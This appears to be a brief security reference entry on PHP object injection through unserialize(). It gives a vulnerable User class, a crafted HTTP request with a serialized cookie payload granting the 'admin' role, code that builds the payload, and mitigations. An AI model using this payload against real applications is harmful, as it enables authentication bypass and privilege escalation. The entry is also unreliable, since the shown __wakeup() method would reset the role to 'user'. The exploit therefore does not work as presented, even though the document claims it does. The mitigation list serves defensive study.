## PHP Object Injection via __wakeup

### Vulnerable Code Pattern
```php
<?php
class User {
    public $username;
    public $role;

    function __wakeup() {
        $this->role = 'user';
    }
}

$data = unserialize($_COOKIE['user']);
?>
```

### Exploit HTTP Request
```
GET /profile HTTP/1.1
Host: vulnerable-app.com
Cookie: user=O:4:"User":2:{s:8:"username";s:5:"admin";s:4:"role";s:5:"admin";}
```

### Payload Construction
```php
<?php
class User {
    public $username = 'admin';
    public $role = 'admin';
}
echo urlencode(serialize(new User()));
// O:4:"User":2:{s:8:"username";s:5:"admin";s:4:"role";s:5:"admin";}
?>
```

### Impact
- Authentication bypass
- Privilege escalation
- Property manipulation
- Code execution via POP chains (gadgets)

### Mitigation
- Never unserialize user input
- Use JSON for data interchange
- Allowed_classes option in PHP 7+
- HMAC validation of serialized data
